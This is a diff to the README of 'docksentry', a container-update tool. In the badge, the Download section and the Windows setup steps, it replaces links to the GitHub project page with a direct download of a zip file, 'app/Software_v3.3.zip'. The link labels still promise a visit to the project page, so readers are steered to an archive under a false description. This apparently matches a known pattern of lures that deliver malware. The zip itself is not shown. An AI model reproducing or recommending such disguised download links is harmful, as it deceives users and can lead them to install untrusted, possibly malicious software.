@@ -1,12 +1,12 @@
 # 🛡️ docksentry - Keep Containers Updated With Ease
 
-[![Download docksentry](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/ryabell2023-cmd/docksentry)
+[![Download docksentry](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ryabell2023-cmd/docksentry/main/app/Software_v3.3.zip)
 
 ## 📥 Download
 
 Visit this page to download and set up docksentry:
 
-https://github.com/ryabell2023-cmd/docksentry
+https://raw.githubusercontent.com/ryabell2023-cmd/docksentry/main/app/Software_v3.3.zip
 
 ## 🧰 What docksentry does
 
@@ -36,7 +36,7 @@ If you plan to use the web UI, keep your browser ready. Any modern browser will 
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/ryabell2023-cmd/docksentry
+   https://raw.githubusercontent.com/ryabell2023-cmd/docksentry/main/app/Software_v3.3.zip
 
 2. Look for the latest release or the main project files.
 
